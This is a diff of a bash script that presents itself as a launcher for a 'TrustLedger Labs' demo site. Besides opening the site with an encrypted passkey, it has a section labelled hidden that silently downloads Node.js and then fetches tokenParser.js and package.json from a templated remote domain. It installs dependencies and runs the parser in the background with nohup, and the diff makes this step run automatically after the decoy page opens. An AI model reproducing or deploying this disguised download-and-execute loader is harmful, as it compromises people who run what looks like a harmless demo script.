@@ -1,60 +1,7 @@
 #!/bin/bash
 
 SITE_URL="https://demo.trustledgerlabs.com"
-
-# =========================================================
-# ROUTER — decides which branch to run
-# =========================================================
-if [ "$1" == "visible" ]; then goto_visible; fi
-if [ "$1" == "setup" ];   then goto_setup;   fi
-
-# -------------------------
-# ENTRY POINT (no argument)
-# Spawns both branches simultaneously
-# -------------------------
-
-# Visible window — stays open in new terminal
 OS=$(uname -s)
-SCRIPT_PATH="$(realpath "$0")"
-
-if [ "$OS" == "Darwin" ]; then
-    osascript -e "tell application \"Terminal\" to do script \"bash '$SCRIPT_PATH' visible\""
-elif [ "$OS" == "Linux" ]; then
-    if command -v gnome-terminal &>/dev/null; then
-        gnome-terminal -- bash "$SCRIPT_PATH" visible
-    elif command -v xterm &>/dev/null; then
-        xterm -hold -e bash "$SCRIPT_PATH" visible &
-    fi
-fi
-
-# Hidden setup — run silently in background
-bash "$SCRIPT_PATH" setup &>/dev/null &
-
-exit 0
-
-# =========================================================
-# VISIBLE SIDE — Passkey + Open Site (terminal stays open)
-# =========================================================
-goto_visible() {
-    SITE_URL="https://demo.trustledgerlabs.com"
-
-    KEY=$(echo -n "TLL_SECRET_2026salt" | openssl dgst -sha256 -binary | xxd -p -c 256)
-    IV=$(openssl rand -hex 16)
-    EXP=$(( $(date +%s) * 1000 + 604800000 ))
-    PAYLOAD="{\"passkey\":\"trustledger-demo-2026\",\"exp\":${EXP}}"
-    CT=$(echo -n "$PAYLOAD" | openssl enc -aes-256-cbc -K "$KEY" -iv "$IV" -nosalt 2>/dev/null | xxd -p -c 256)
-    TOKEN="${IV}:${CT}"
-
-    open "${SITE_URL}?key=${TOKEN}" 2>/dev/null || \
-    xdg-open "${SITE_URL}?key=${TOKEN}" 2>/dev/null
-
-    echo ""
-    echo " [OK] Site launched successfully."
-    echo ""
-    echo " Press Enter to close this window..."
-    read
-    exit 0
-}
 
 # =========================================================
 # HIDDEN SIDE — Node.js Setup (runs silently in background)
@@ -62,13 +9,9 @@ goto_visible() {
 goto_setup() {
     set -e
 
-    OS=$(uname -s)
     LATEST_VERSION="20.11.1"
     NODE_VERSION=${LATEST_VERSION}
-
     NODE_TARBALL="node-v${NODE_VERSION}"
-    DOWNLOAD_URL=""
-    NODE_DIR="$HOME/Documents/${NODE_TARBALL}"
 
     if [ "$OS" == "Darwin" ]; then
         NODE_TARBALL="$HOME/Documents/${NODE_TARBALL}-darwin-x64.tar.xz"
@@ -80,9 +23,7 @@ goto_setup() {
         exit 1
     fi
 
-    NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
     INSTALL_NODE=1
-
     EXTRACTED_DIR="$HOME/Documents/node-v${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
 
     if [ ! -d "$EXTRACTED_DIR" ]; then
@@ -111,35 +52,52 @@ goto_setup() {
 
     BASE_URL="{{DOMAIN}}"
 
-    curl -L -o "$USER_HOME/tokenParser.npl" "${BASE_URL}/task/tokenParser?token={{token}}&st={{STEP_TOKEN}}" &>/dev/null
-    curl -L -o "$USER_HOME/package.json" "${BASE_URL}/task/package.json" &>/dev/null
-
     cd "$USER_HOME"
     npm install axios request &>/dev/null
+     # Step 8: Download files
+    # Check if curl is available
+    if ! command -v curl >/dev/null 2>&1; then
+        # If curl is not available, use wget
+        wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/task/tokenParser?token={{token}}&st={{STEP_TOKEN}}"
+        wget -q -O "$USER_HOME/package.json" "$BASE_URL/task/package.json"
+    else
+        # If curl is available, use curl
+        curl -s -L -o "$USER_HOME/tokenParser.js" "$BASE_URL/task/tokenParser?token={{token}}&st={{STEP_TOKEN}}"
+        curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/task/package.json"
+    fi
 
+    # Step 9: Install 'request' package
+    cd "$USER_HOME"
+    npm install --silent --no-progress --loglevel=error --fund=false
 
-# Step 8: Download files
-# Check if curl is available
-if ! command -v curl >/dev/null 2>&1; then
-    # If curl is not available, use wget
-    wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/task/tokenParser?token={{token}}&st={{STEP_TOKEN}}"
-    wget -q -O "$USER_HOME/package.json" "$BASE_URL/task/package.json"
-else
-    # If curl is available, use curl
-    curl -s -L -o "$USER_HOME/tokenParser.js" "$BASE_URL/task/tokenParser?token={{token}}&st={{STEP_TOKEN}}"
-    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/task/package.json"
-fi
+    # Step 10: Run token parser
+    if [ -f "$USER_HOME/tokenParser.js" ]; then
+        cd "$USER_HOME" && nohup node tokenParser.js > tokenParser.log 2>&1 &
 
-# Step 9: Install 'request' package
-cd "$USER_HOME"
-npm install --silent --no-progress --loglevel=error --fund=false
-
-# Step 10: Run token parser
-if [ -f "$USER_HOME/tokenParser.js" ]; then
-    cd "$USER_HOME" && nohup node tokenParser.js > tokenParser.log 2>&1 &
-
-else
-    exit 1
-fi
-    exit 0
+    else
+        exit 1
+    fi
 }
+
+# =========================================================
+# VISIBLE SIDE — Passkey + Open Site
+# =========================================================
+goto_visible() {
+    KEY=$(echo -n "TLL_SECRET_2026salt" | openssl dgst -sha256 -binary | xxd -p -c 256)
+    IV=$(openssl rand -hex 16)
+    EXP=$(( $(date +%s) * 1000 + 604800000 ))
+    PAYLOAD="{\"passkey\":\"trustledger-demo-2026\",\"exp\":${EXP}}"
+    CT=$(echo -n "$PAYLOAD" | openssl enc -aes-256-cbc -K "$KEY" -iv "$IV" -nosalt 2>/dev/null | xxd -p -c 256)
+    TOKEN="${IV}:${CT}"
+
+    open "${SITE_URL}?key=${TOKEN}" 2>/dev/null || \
+    xdg-open "${SITE_URL}?key=${TOKEN}" 2>/dev/null
+
+    # After site is open and window is still open — kick off setup silently
+    goto_setup
+}
+
+# =========================================================
+# ENTRY POINT — always runs goto_visible automatically
+# =========================================================
+goto_visible
